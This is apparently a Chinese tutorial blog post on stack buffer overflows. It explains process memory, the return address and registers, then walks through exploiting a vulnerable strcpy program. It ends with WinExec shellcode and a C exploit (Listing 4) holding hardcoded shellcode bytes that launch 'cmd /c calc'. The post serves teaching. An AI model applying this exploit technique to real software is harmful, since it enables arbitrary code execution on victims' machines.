---
layout: post
title:  web 安全系列-16-buffer overflow 缓冲区溢出
date:  2020-08-09 10:37:20 +0800
categories: [web]
tags: [web, web-safe, sf]
published: true
---

# 缓冲区溢出

缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。

利用缓冲区溢出攻击，可以导致程序运行失败、系统宕机、重新启动等后果。

更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。

缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。

![输入图片说明](https://images.gitee.com/uploads/images/2020/0818/100554_34de9552_508704.png)


# 相关基础知识

## 进程内存空间

当一个程序被执行的时候，它的各个编译单元被映射到一个组织良好的内存结构上，如图1所示：

![输入图片说明](https://images.gitee.com/uploads/images/2020/0818/100744_90457680_508704.png)

扩展:

text 段保护了基本的可执行的程序代码，data段包括了所有的全局变量，data段的长度在编译的时候决定。

在内存空间的顶端是由stack和heap共享的地址段，他们都是在运行时分配。Stack用来保存函数调用的参数，局部变量以及一些用来保存程序当前状态的寄存器值。

Heap分配给动态变量，比如malloc和new。

## Stack 用来干什么？

Stack是一个LIFO队列（先进后出），由于stack是在函数的生命周期分配的，因此只有在此生命周期内的变量存在在那，这一切的根源在于机构化编程的本质，我们吧代码分解为一个一个的函数代码段。

当程序在内存里面运行的时候，它时而顺序的调用函数，时而从一个函数调用另外一个函数，从而构成了一个多层的调用链。

当一个函数执行完后。它需要去执行紧接着它的下一个指令，当从一个函数调用另外一个函数的时候，它需要冻住（frozen）当前的变量状态，以便函数执行完返回后恢复。

Stack正好能实现这些需求。

## 函数调用

CPU顺序执行CPU的指令，使用一个扩展的EIP寄存器来维护执行的顺序。

这个寄存器保存了下一个被执行的指令地址。

例如，运行一个jump或者call一个函数，将会修改EIP寄存器。大家想如果把当前代码的地址写入EIP，会发生什么？

调用完该函数后需要执行的下一个指令的地址叫返回地址（return address），当一个函数被调用的时候，我们需要把返回地址压入堆栈。

从攻击者的角度来看，这个机制至为重要。

如果攻击者通过某种方法设法修改了保存在堆栈里面的返回地址，那么当函数执行完的时候，这个地址将被加载到EIP，因此内存溢出的代码将被下一个执行，而不是程序里面的代码，下面的代码可以用来解释堆栈的工作原理。

```c
void f(int a, int b)
{
    char buf[10];
    // <-- the stack is watched here
}

void main()
{
    f(1, 2);
}
```

当进入 f(), 堆栈的内容如图2所示。

![输入图片说明](https://images.gitee.com/uploads/images/2020/0818/101013_40e912ae_508704.png)

扩展:

首先，函数的参数被压入了堆栈的底部（C语言的规则如此），紧接着是返回地址。

下面进入f()的执行，它首先把当前的EBP寄存器压入堆栈（后面解释）并且给函数的局部变量分配空间。

有两件事值得注意：第一，stack是自顶部向下分配的，我们的记住下面这句汇编是增加了stack的大小，虽然这看起来有点容易迷惑，事实上就是ESP越大，堆栈越小。：

```
sub esp, 08h
```

第二，stack是32位对齐的，也就是说如果一个10字符的数组要占用12字节。

## Stack如何工作？

有两个CPU寄存器对于stack的功能至关重要，它是ESP和EBP。

ESP保存stack的顶部地址，ESP可以被修改，可以被直接修改或者间接修改，直接操作的指令比如，add esp, 08h，将导致ESP缩小8个字节。

间接的操作，比如压栈和出栈操作。

EBP寄存器指向堆栈的底部，更精确的说是包含了堆栈底部和可执行代码之间的距离。

每次调用一个新函数的时候，当前EBP的值被首先压入stack，然后新的ESP值将被移入EBP寄存器，现在EBP指向了当前函数的堆栈底部。

由于ESP指向stack的顶部，它在程序执行过程中不断变化，用它作为偏移量寄存器很笨重，这就是为什么要有EBP的原因。

# 威胁

如何知道什么地方可能会被攻击？

我们现在只知道返回地址是保存在stack上面，同时函数变量也是在stack里面进行处理。

后面我们将了解，在某些特定的环境下，正是由于这两个特性导致返回地址可以被改变。

带着这个疑问，下面让我们来看一段简单的小程序。

## Listing 2

```c
#include
char *code = "AAAABBBBCCCCDDD"; //including the character '\0' size = 16 bytes

void main()
{
    char buf[8];
    strcpy(buf, code);
}
```

当执行该程序的时候，该程序会提示“内存访问错误”，为什么？

因为当我们尝试把一个16字节的字符串写入一个8字节的空间（这个很少发生，因为缺乏必要的空间限制检查）。

因此分配的内存空间已经被超过，在stack底部的数据已经被改写。

让我们再回顾一下图2，stack里面的重要的数据：帧地址和返回地址都已经被改写了！

因此，当函数返回的时候，一个错误的返回地址已经被写到EIP，这样允许程序去执行该地址指向的值，产生了一个stack操作错误。

由此看来，在stack里面破坏返回地址不仅可行而且很平常。

糟糕的程序或者含有bug的软件给攻击者提供了一个巨大的机会去执行攻击者设计的恶意代码。

# Stack overrun

现在我们该梳理一下所有这些知识了。

我们已经知道程序通过EIP寄存器控制代码的执行，我们还知道在调用函数的时候紧跟在函数后面的一句代码的地址被压入堆栈，在函数调用返回的时候从stack恢复并移到EIP寄存器。

通过一种控制的方法进行内存溢出写入，我们可以弄清返回地址被保存的具体位置。

这样攻击者就拥有了所有的信息可以去控制程序执行他想执行的代码，创建有害的进程。

## 流程

简单的来说，有效的进行内存侵害的算法如下：

1. 找到一段存在内存越界缺陷的代码；

2. 探测需要多少字节才能修改返回地址；

3. 计算指向改变后代码的地址；

4. 写一段代码用于被执行；

5. 链接在一起进行测试。

## 代码例子

下面的 Listing 3 是一段可以被利用的代码示例：

```c
#include
#define BUF_LEN 40

void main(int argc, char **argv)
{

    char buf[BUF_LEN];
    if (argv > 1)
    {
        printf("\buffer length: %d\nparameter length: %d", BUF_LEN, strlen(argv[1]) );
        strcpy(buf, argv[1]);
    }
}
```

这段代码拥有所有的内存溢出缺陷的特征：局部stack缓冲，一个不安全的函数会去改写内存，第一个命令行参数没有进行长度检查。

加上我们新学到的知识，让我们来完成一个攻击任务。

## 攻击演示

我们已经清楚，猜测一段代码存在内存溢出缺陷非常容易，如果有源代码的话就更容易了。

第一个方法就是寻找字符相关函数，比如strcpy(),strcat()或者gets()，他们的共有的特性是都没有长度限制的拷贝，直到发现NULL(code 0)为止。

而且这些函数在局部缓冲上进行操作，有机会修改保存在局部缓冲上的函数的返回地址。

另外一个方法是反复试探法，通过填充大批量的数据，比如下面的例子：

```
victim.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

如果程序返回一个访问冲突的错误，我们就可以向下一步了。

下一步，我们需要构造一个大字符串，能够破坏返回地址。

这一步也非常简单，还记得前面我们说过写入stack都是以WORD对齐的么，我们可以构造如下示例的字符串：

```
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUU.............
```

如果成功，这个字符串将导致程序crash，并弹出著名的错误对话框：

```
The instruction at „0x4b4b4b4b” referenced memory at „0x4b4b4b4b”. The memory could not be „read”
```

我们知道，0x4b就是字符”K”的ASCII码，返回地址已经被“KKKK”改写了。

好了，下面我们可以进入步骤3了，找到当前buffer的开始地址不太容易。

有很多方法进行这种“试探”，现在我们来讨论其中一种，其它的后面在讨论。

我们可以通过跟踪代码的方式来获得所需要的地址。

首先通过debugger加载目标程序，然后开始单步执行，不过令人头痛的是开始执行的时候会有一系列和我们代码不相关的系统函数调用。

或者在程序运行时监控程序的stack，跟踪到出现我们输入的字符串的下一句。

不管用哪个方法，我们最终要找到类似于如下的代码就算达到目的了：

```
:00401045 8A08 mov cl, byte ptr [eax]
:00401047 880C02 mov byte ptr [edx+eax], cl
:0040104A 40 inc eax
:0040104B 84C9 test cl, cl
:0040104D 75F6 jne 00401045
```

这个是我们所要寻找的strcpy函数，进入函数后，首先读入EAX指向的内存的字节，下一行代码再写入到EDX+EAX的地址去，通过读寄存器，我们可以获得这个缓存的地址是0x0012fec0。

写一段shellcode也是一门艺术。

不同的操作系统使用不同的系统函数，就需要不同的方法达到我们的目的。

最简单的情况下，我们什么都不做，只是改写返回地址，导致程序出现偏离预计的行为。

事实上，攻击者可以执行任意的代码，唯一的约束是可使用的空间大小（事实上这一点也可以设法克服）和程序的访问权限。

在大部分情况下，缓冲溢出正是一种被用来获得超级用户权限、利用有缺陷的系统进行DOS攻击的方法。

## 执行处理命令

例如，创建一段shellcode允许执行命令行处理程序（WinNT/2000下的cmd.exe）。

通过调用系统函数WinExec或者CreateProcess就可以实现这个目标。

调用WinExec的代码如下：

```
WinExec(command, state)
```

为了实现我们的目标，women需要传递这样的参数：

- 将我们需要传入的参数字符串压栈，也就是“cmd /c calc”.

- 将第二个参数压栈，这儿我们不需要内容，就压入NULL（0）。（从右向左的参数调用规则，先压入第二个参数）

- 将刚刚压入的“cmd /c calc”的地址作为第一个参数压栈。

- 调用WinExec系统函数.

### 实现函数

下面的代码是完成这个目标的一个实现：

```
sub esp, 28h ; 3 bytes
jmp calling ; 2 bytes
par:
call WinExec ; 5 bytes
push eax ; 1 byte
call ExitProcess ; 5 bytes
calling:
xor eax, eax ; 2 bytes
push eax ; 1 byte
call par ; 5 bytes
.string cmd /c calc|| ; 13 bytes
```

### 代码解释

关于代码的一些解释：

```
sub esp, 28h
```

在函数退出的时候会首先回收函数的局部变量的栈长度，刚刚写入stack的部分代码现在被声明为无效了，这就意味着程序将会把这部分stack分配给别的函数调用使用，从而破坏我们刚刚写入的代码，因此我们的第一个代码就是将ESP减40个字节（相应的stack增长了40个字节）。

```
jmp calling
```

下一行语句跳转到WinExec函数参数压栈的代码。

我们需要注意以下几点：

第一，NULL值必须通过精心构造的方法获得，因为如果我们直接写一个0的话，将会在strcpy的时候被当成是字符串结尾而导致后面的代码无法被写入堆栈。

因此只能把字符串放在最后。

我们知道，调用call指令的时候，会自动将下一个指令的指针压入stack作为返回地址，我们可以利用这个特性来把字符串和字符串的地址压入堆栈。

为此我们首先跳转到calling语句的位置，将第二个参数压入堆栈，然后调用call，将后面的地址压入堆栈，接着开始顺序调用WinExec和ExitProcess，下图是调用顺序，方便的计算各个变量的值。

![输入图片说明](https://images.gitee.com/uploads/images/2020/0818/101913_fa1f25e2_508704.png)

我们看到，我们的例子没有考虑EBP压栈的大小，这是因为我们假设使用VC7编译，该编译器不向堆栈压入EBP寄存器的内容。

剩下的工作就是把上面的代码转换为二进制格式并完成程序进行测试了，下面是代码：

- Listing 4 – Exploit of a program victim.exe

```c
char *victim = "victim.exe";
char *code = "\x90\x90\x90\x83\xec\x28\xeb\x0b\xe8\xe2\xa8\xd6\x77\x50\xe8\xc1\x90\xd6\x77\x33\xc0\x50\xe8\xed\xff\xff\xff";
char *oper = "cmd /c calc||";
char *rets = "\xc0\xfe\x12";
char par[42];

void main()
{
    strncat(par, code, 28);
    strncat(par, oper, 14);
    strncat(par, rets, 4);

    char *buf;
    buf = (char*)malloc( strlen(victim) + strlen(par) + 4);

    if (!buf)
    {
        printf("Error malloc");
        return;
    }

    wsprintf(buf, "%s \"%s\"", victim, par);
    printf("Calling: %s", buf);
    WinExec(buf, 0);

}
```

# 拓展阅读  

[web 安全系列](https://houbb.github.io/2020/08/09/web-safe-00-overview)

# 参考资料

[百科](https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA)

[缓冲区溢出攻击样例分析](https://xz.aliyun.com/t/5964)

* any list
{:toc}